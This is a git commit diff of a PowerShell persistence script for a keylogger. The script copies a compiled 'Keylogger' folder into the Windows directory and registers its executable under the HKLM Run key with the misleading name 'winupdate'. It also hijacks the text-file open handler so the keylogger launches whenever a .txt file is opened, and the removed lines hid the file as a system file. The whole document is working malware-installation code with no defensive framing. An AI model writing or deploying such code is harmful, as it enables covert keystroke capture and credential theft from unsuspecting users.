5a465d565945fc9f91f609e74940a6388c6117e1
xp4xbox <nicman1080@gmail.com>
2017-09-23 10:05:04 -0400

    Persistence uses compiled dir over singlefile

--- Persistence/Persistence.ps1
+++ Persistence/Persistence.ps1
@@ -1,8 +1,9 @@
 # NOTE: If text files are associated with something other than notepad, this will override it.
 # You will also need to compile file as .exe
 
-# Set the file name as your .exe
-$strFileName = "file.exe"
+# Set the compiled folder name
+$strFileDir = "Keylogger"
+
 
 If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
@@ -15,15 +16,17 @@ Set-Location -Path $strDirScriptPath
 
 $WINDIR = "$env:WINDIR"
 
-# Copy file to windir folder
-If (test-path "$WINDIR\$strFileName") {Remove-Item "$WINDIR\$strFileName" -Force}
-Copy-Item $strFileName $WINDIR -Force
+# if folder already exists, exit
+If (test-path "$WINDIR\$strFileDir") {exit}
+# Copy folder to windir
+Copy-Item -Path $strFileDir -Destination $WINDIR -Recurse -Force
+
+# get path of executable
+$strFileName  = get-childitem -Filter *.exe $WINDIR\$strFileDir
+$strFilePath = $strFileName.FullName
 
 # make program run at startup
-New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value $WINDIR\$strFileName -Force
+New-ItemProperty -path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
 
 # make program open anytime a user opens a text file
-New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$WINDIR\$strFileName %1" -Force
-
-# set attributes to be a system file and a hidden file
-$objGetFile=Get-Item $WINDIR\$strFileName; $objGetFile.Attributes = 'System, Hidden'
+New-ItemProperty -path HKLM:\Software\Classes\txtfile\shell\open\command -name "(Default)" -PropertyType ExpandString -value "$strFilePath %1" -Force
